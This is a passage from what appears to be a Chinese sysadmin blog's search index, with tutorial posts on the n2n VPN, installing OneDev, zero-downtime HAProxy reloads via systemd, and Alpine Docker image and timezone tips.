n2n0 的网卡。\n","permalink":"https://rendoumi.com/posts/20211105-n2n_vpn/","summary":"\u003cp\u003evpn的搭建一直是一个难解的题目，openvpn、ipsec、tinc 都在用，都不够简洁。\u003c/p\u003e\n\u003cp\u003en2n 是一种 peer to peer 端到端的 vpn，搭建起来非常简单方便。必备利器\u003c/p\u003e\n\u003cp\u003e首先了解一下概念\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105135642166\" loading=\"lazy\" src=\"/posts/20211105-n2n_vpn/image-20211105135642166.png\"\u003e\u003c/p\u003e\n\u003cp\u003en2n 的 vpn 分为两种角色，Supernode 超级节点和 Edgenode 边缘节点。\u003c/p\u003e\n\u003cp\u003e很简单，Supernode 最好是公网地址，需要开放端口供其它节点连接上来；剩余的 Edgenode 可以没有公网地址，各个 Edgenode 边缘节点之间会尝试绕过 Supernode 直接连接。这大大提高了节点之间通讯的效率。通讯是加密的，非常安全。\u003c/p\u003e\n\u003cp\u003e安装的话完全不用安装，直接一个命令就搞定了。\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/ntop/n2n\"\u003ehttps://github.com/ntop/n2n\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e弄出两个可执行文件 supernode 和 edge 就好了\u003c/p\u003e\n\u003cp\u003e超级节点：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/supernode -p \u003cspan class=\"m\"\u003e11111\u003c/span\u003e -v\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e边缘节点：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/edge -d n2n0 -c ThisisaSecret2012 -k Fuck2020 -a 192.168.0.2 -l 41.22.59.112:11111 -f\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e参数解释：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e-d 生成的虚拟网卡的命名\u003c/li\u003e\n\u003cli\u003e-c \u003c!-- raw HTML omitted --\u003e 某组vpn节点的口令。大家看到启动 supernode 的时候没有任何参数，supdernode 只负责转发。supernode 支持多组不同的 vpn。这里就是用来区分不同的 vpn 组的。\u003c/li\u003e\n\u003cli\u003e-k \u003c!-- raw HTML omitted --\u003e 节点之间通讯是用的 twofish 加密算法，这里指定的是密钥\u003c/li\u003e\n\u003cli\u003e-a 节点的ip\u003c/li\u003e\n\u003cli\u003e-l supernode的ip和端口\u003c/li\u003e\n\u003cli\u003e-f 放到后台 daemon 执行\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这样就建立好了，系统中会多出一张 n2n0 的网卡。\u003c/p\u003e","title":"n2n一种peer to peer的VPN的使用"},{"content":"其实一直在用 github、gitlab、jenkins，但是 github 时不时的抽风， gitlab 的 runner 套 Docker in docker 的方法委实很难用。\n所以 CI/CD 这一块反倒挺喜欢阿里云效这种简便易行的。但确实找不到其他合适且类似的软件。\n从 V2EX 上看到一个老哥发的 onedev，是一个一站式的开源软件，这不就试试先\n以 centos7 为例，安装过程如下：\n一、安装 java 1.8 版本 rpm -ivh jdk-8u201-linux-x64.rpm 二、安装 git 高版本 缺省 centos7 和 epel 带的 git 版本太低，不符合要求，得加个新的源装新版本\nyum -y install https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm yum -y install git curl 三、安装配置 onedev https://github.com/theonedev/onedev\n下载压缩包，然后解压运行 bin/server.sh start ，很简洁，不错！\n运行完打开 http://192.168.86.101:6610 进行初始配置，就两步就 ok 了。\n三、例子 我们是要在正式生产环境用的，所以在 projects 新建一个项目 spring-boot，以 spring-petclinic 为例：\n然后到源代码目录下\ngit clone https://github.com/spring-projects/spring-petclinic.git cd spring-petclinic ./mvnw package cd spring-petclinic git init git add . git commit -m \u0026#34;Spring boot demo project\u0026#34; git remote add origin http://192.168.86.101:6610/spring-boot git push --set-upstream origin master 这样就可以在 spring-boot 里看到代码了\n然后看上图，有个紫色灯泡，Enable build support by adding.onedev-buildspec.yml，点那个链接就可以进入一系列 build 、push、deploy 的 pipeline 了。\n友情提示，单机的话，机器需要装 onedev 的 agent，然后还有 docker，就可以build了。用起来感觉跟云效差不多，很不错。\n","permalink":"https://rendoumi.com/posts/20211105-onedev/","summary":"\u003cp\u003e其实一直在用 github、gitlab、jenkins，但是 github 时不时的抽风， gitlab 的 runner 套 Docker in docker 的方法委实很难用。\u003c/p\u003e\n\u003cp\u003e所以 CI/CD 这一块反倒挺喜欢阿里云效这种简便易行的。但确实找不到其他合适且类似的软件。\u003c/p\u003e\n\u003cp\u003e从 V2EX 上看到一个老哥发的 onedev，是一个一站式的开源软件，这不就试试先\u003c/p\u003e\n\u003cp\u003e以 centos7 为例，安装过程如下：\u003c/p\u003e\n\u003ch2 id=\"一安装--java-18-版本\"\u003e一、安装  java 1.8 版本\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh jdk-8u201-linux-x64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二安装-git-高版本\"\u003e二、安装 git 高版本\u003c/h2\u003e\n\u003cp\u003e缺省 centos7 和 epel 带的 git 版本太低，不符合要求，得加个新的源装新版本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install git curl\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"三安装配置-onedev\"\u003e三、安装配置 onedev\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/theonedev/onedev\"\u003ehttps://github.com/theonedev/onedev\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e下载压缩包，然后解压运行 bin/server.sh start ，很简洁，不错！\u003c/p\u003e\n\u003cp\u003e运行完打开 http://192.168.86.101:6610 进行初始配置，就两步就 ok 了。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105110253646\" loading=\"lazy\" src=\"/posts/20211105-onedev/image-20211105110253646.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105110326330\" loading=\"lazy\" src=\"/posts/20211105-onedev/image-20211105110326330.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"三例子\"\u003e三、例子\u003c/h2\u003e\n\u003cp\u003e我们是要在正式生产环境用的，所以在 projects 新建一个项目 spring-boot，以 spring-petclinic 为例：\u003c/p\u003e\n\u003cp\u003e然后到源代码目录下\u003c/p\u003e","title":"一站式Git软件onedev的安装使用"},{"content":"Nginx 可以用 kill -HUP 来重启，不会丢失已建连接。Haproxy 如何做才能做到 zero downtime 无缝重载呢？\n做法如下：\n一、配置 编译harpoxy的时候带上参数 USE_SYSTEMD，选择 Haproxy 1.8 以上版本\nmake TARGET=linux2628 USE_GETADDRINFO=1 USE_ZLIB=1 USE_REGPARM=1 USE_OPENSSL=1 \\ USE_SYSTEMD=1 USE_PCRE=1 USE_PCRE_JIT=1 USE_NS=1 make install Haproxy无缝重载技术：\n旧进程当前管理的连接根据 file descriptor 文件描述符通过 socket 套接字传输到新进程。\n在这个过程中，文件socket（unix socket）的连接没有断开。\n新进程在充当 master-worker 主工作者的同时执行此任务。\n综上所述，通过使用unix socket来维护连接状态并在旧进程和新进程之间传递，防止了连接丢失。\nhaproxy 的运行使用 Systemd 重载，使用 -Ws 方式。 （此外，在构建时必须启用 USE_SYSTEMD）\n-D : start as a daemon. The process detaches from the current terminal after forking, and errors are not reported anymore in the terminal. It is equivalent to the \u0026#34;daemon\u0026#34; keyword in the \u0026#34;global\u0026#34; section of the configuration. It is recommended to always force it in any init script so that a faulty configuration doesn\u0026#39;t prevent the system from booting. -W : master-worker mode. It is equivalent to the \u0026#34;master-worker\u0026#34; keyword in the \u0026#34;global\u0026#34; section of the configuration. This mode will launch a \u0026#34;master\u0026#34; which will monitor the \u0026#34;workers\u0026#34;. Using this mode, you can reload HAProxy directly by sending a SIGUSR2 signal to the master. The master-worker mode is compatible either with the foreground or daemon mode. It is recommended to use this mode with multiprocess and systemd. -Ws : master-worker mode with support of `notify` type of systemd service. This option is only available when HAProxy was built with `USE_SYSTEMD` build option enabled. 具体的启动脚本：/etc/systemd/system/haproxy.service\n[Unit] Description=HAProxy Load Balancer After=network-online.target Wants=network-online.target [Service] Environment=\u0026#34;CONFIG=/etc/haproxy/haproxy.cfg\u0026#34; \u0026#34;PIDFILE=/run/haproxy.pid\u0026#34; ExecStartPre=/usr/sbin/haproxy -f $CONFIG -c -q ExecStart=/usr/sbin/haproxy -Ws -f $CONFIG -p $PIDFILE ExecReload=/usr/sbin/haproxy -f $CONFIG -c -q ExecReload=/bin/kill -USR2 $MAINPID KillMode=mixed Restart=always SuccessExitStatus=143 Type=notify # The following lines leverage SystemD\u0026#39;s sandboxing options to provide # defense in depth protection at the expense of restricting some flexibility # in your setup (e.g. placement of your configuration files) or possibly # reduced performance. See systemd.service(5) and systemd.exec(5) for further # information. # NoNewPrivileges=true # ProtectHome=true # If you want to use \u0026#39;ProtectSystem=strict\u0026#39; you should whitelist the PIDFILE, # any state files and any other files written using \u0026#39;ReadWritePaths\u0026#39; or # \u0026#39;RuntimeDirectory\u0026#39;. # ProtectSystem=true # ProtectKernelTunables=true # ProtectKernelModules=true # ProtectControlGroups=true # If your SystemD version supports them, you can add: @reboot, @swap, @sync # SystemCallFilter=~@cpu-emulation @keyring @module @obsolete @raw-io [Install] WantedBy=multi-user.target 二、验证 验证是否真的是无缝重载的步骤如下：\n在haproxy.cfg的global段落中加入stat的配置：\nstats socket /var/run/haproxy.sock level admin expose-fd listeners process 1 运行一个不断循环重启的脚本：\nwhile true ; do systemctl reload haproxy ; sleep 3 ; done 用 apache 的压测工具 ab 来压一下。\nSend request while service is reloading:\nab -r -c 20 -n 100000 http://127.0.0.1/ 最后检查结果中 \u0026ldquo;Failed requests\u0026rdquo; 是否为零就可以了\n","permalink":"https://rendoumi.com/posts/20211104-haproxy_restart/","summary":"\u003cp\u003eNginx 可以用 kill -HUP 来重启，不会丢失已建连接。Haproxy 如何做才能做到 zero downtime 无缝重载呢？\u003c/p\u003e\n\u003cp\u003e做法如下：\u003c/p\u003e\n\u003ch2 id=\"一配置\"\u003e一、配置\u003c/h2\u003e\n\u003cp\u003e编译harpoxy的时候带上参数 USE_SYSTEMD，选择 Haproxy 1.8 以上版本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003eTARGET\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux2628 \u003cspan class=\"nv\"\u003eUSE_GETADDRINFO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_ZLIB\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_REGPARM\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_OPENSSL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"nv\"\u003eUSE_SYSTEMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE_JIT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_NS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eHaproxy无缝重载技术：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e旧进程当前管理的连接根据 file descriptor 文件描述符通过 socket 套接字传输到新进程。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在这个过程中，文件socket（unix socket）的连接没有断开。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e新进程在充当 master-worker 主工作者的同时执行此任务。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e综上所述，通过使用unix socket来维护连接状态并在旧进程和新进程之间传递，防止了连接丢失。\u003c/p\u003e\n\u003cp\u003ehaproxy 的运行使用 Systemd 重载，使用 -Ws 方式。 （此外，在构建时必须启用 USE_SYSTEMD）\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e-D : start as a daemon. The process detaches from the current terminal after\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eforking, and errors are not reported anymore in the terminal. It is\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eequivalent to the \u0026#34;daemon\u0026#34; keyword in the \u0026#34;global\u0026#34; section of the\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003econfiguration. It is recommended to always force it in any init script so\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ethat a faulty configuration doesn\u0026#39;t prevent the system from booting.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e-W : master-worker mode. It is equivalent to the \u0026#34;master-worker\u0026#34; keyword in\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ethe \u0026#34;global\u0026#34; section of the configuration. This mode will launch a \u0026#34;master\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ewhich will monitor the \u0026#34;workers\u0026#34;. Using this mode, you can reload HAProxy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003edirectly by sending a SIGUSR2 signal to the master.  The master-worker mode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eis compatible either with the foreground or daemon mode.  It is\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003erecommended to use this mode with multiprocess and systemd.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e-Ws : master-worker mode with support of `notify` type of systemd service.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eThis option is only available when HAProxy was built with `USE_SYSTEMD`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ebuild option enabled.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e具体的启动脚本：/etc/systemd/system/haproxy.service\u003c/p\u003e","title":"Haproxy的Zero downtime重启如何做"},{"content":"用 alphine 镜像的一些常用技巧：\n会随时增加：\n一、修改源，用国外的源非常慢，替换成国内的中科大源 sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39; /etc/apk/repositories 二、更新apk库 apk update 三、安装软件 #安装telnet apk add busybox-extras #安装curl apk add curl #安装时间组件 apk add tzdata #更新并且安装软件 apk add --update tzdata 四、进入容器一步执行换源、更新、安装 sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39; /etc/apk/repositories \u0026amp;\u0026amp; apk update \u0026amp;\u0026amp; apk add curl \u0026amp;\u0026amp; apk add busybox-extras 五、解决缺少glibc库的问题 如果不ln会报错，原因是缺少glibc库！！！解决方法如下：\nRUN mkdir /lib64 \u0026amp;\u0026amp; \\ ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2 六、一些调试的CMD CMD [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;] kubectl run curlpod --image=radial/busyboxplus:curl --command -- /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; 七、pod的等待技巧 这儿里启动正式的pod之前，先临时起了两个容器等待其他服务的完成\ncontainers: - name: myapp-container image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo The app is running! \u0026amp;\u0026amp; sleep 3600\u0026#39;] initContainers: - name: init-myservice image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup myservice; do echo waiting for myservice; sleep 2; done;\u0026#39;] - name: init-mydb image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup mydb; do echo waiting for mydb; sleep 2; done;\u0026#39;] ","permalink":"https://rendoumi.com/posts/20211104-alphine_usage/","summary":"\u003cp\u003e用 alphine 镜像的一些常用技巧：\u003c/p\u003e\n\u003cp\u003e会随时增加：\u003c/p\u003e\n\u003ch2 id=\"一修改源用国外的源非常慢替换成国内的中科大源\"\u003e一、修改源，用国外的源非常慢，替换成国内的中科大源\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39;\u003c/span\u003e /etc/apk/repositories\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二更新apk库\"\u003e二、更新apk库\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk update\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"三安装软件\"\u003e三、安装软件\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#安装telnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add busybox-extras\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#安装curl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add curl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#安装时间组件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add tzdata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#更新并且安装软件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add --update tzdata\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"四进入容器一步执行换源更新安装\"\u003e四、进入容器一步执行换源、更新、安装\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s1\"\u003e\u0026#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g\u0026#39;\u003c/span\u003e /etc/apk/repositories \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apk update \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apk add curl \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apk add busybox-extras\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"五解决缺少glibc库的问题\"\u003e五、解决缺少glibc库的问题\u003c/h2\u003e\n\u003cp\u003e如果不ln会报错，原因是缺少glibc库！！！解决方法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRUN mkdir /lib64 \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"六一些调试的cmd\"\u003e六、一些调试的CMD\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCMD \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/bin/bash\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-c\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl run curlpod --image\u003cspan class=\"o\"\u003e=\u003c/span\u003eradial/busyboxplus:curl --command -- /bin/sh -c \u003cspan class=\"s2\"\u003e\u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"七pod的等待技巧\"\u003e七、pod的等待技巧\u003c/h2\u003e\n\u003cp\u003e这儿里启动正式的pod之前，先临时起了两个容器等待其他服务的完成\u003c/p\u003e","title":"alphine镜像的使用技巧"},{"content":"我们都喜欢用 alphine 的镜像做底包，来生产自己的镜像\nalphine 的底包的时间设定就非常重要了\n直接给出 Dockerfile\nFROM alpine:3.12 # latest certs RUN apk add ca-certificates --no-cache \u0026amp;\u0026amp; update-ca-certificates # timezone support ENV TZ=Asia/Shanghai RUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\ cp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\ echo $TZ \u0026gt; /etc/timezone # install chrony and place default conf which can be overridden with volume RUN apk add --no-cache chrony \u0026amp;\u0026amp; mkdir -p /etc/chrony COPY chrony.conf /etc/chrony/. # port exposed EXPOSE 123/udp # start CMD [ \u0026#34;/usr/sbin/chronyd\u0026#34;, \u0026#34;-d\u0026#34;, \u0026#34;-s\u0026#34;] 时间设定重要的就是下面这几行\n# timezone support ENV TZ=Asia/Shanghai RUN apk add --update tzdata --no-cache \u0026amp;\u0026amp;\\ cp /usr/share/zoneinfo/${TZ} /etc/localtime \u0026amp;\u0026amp;\\ echo $TZ \u0026gt; /etc/timezone 还有如果在 image: maven:3.5-jdk-8-alpine 这种镜像里，无论怎么改时间都不是东八区，可以试试下面的命令：\nexport COMMIT_TIME=$(TZ=CST-8 date +%F-%H-%M) ","permalink":"https://rendoumi.com/posts/20211103-alphine_timezone/","summary":"\u003cp\u003e我们都喜欢用 alphine 的镜像做底包，来生产自己的镜像\u003c/p\u003e\n\u003cp\u003ealphine 的底包的时间设定就非常重要了\u003c/p\u003e\n\u003cp\u003e直接给出 Dockerfile\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# latest certs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add ca-certificates --no-cache \u0026amp;\u0026amp; update-ca-certificates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# timezone support\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV TZ\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan 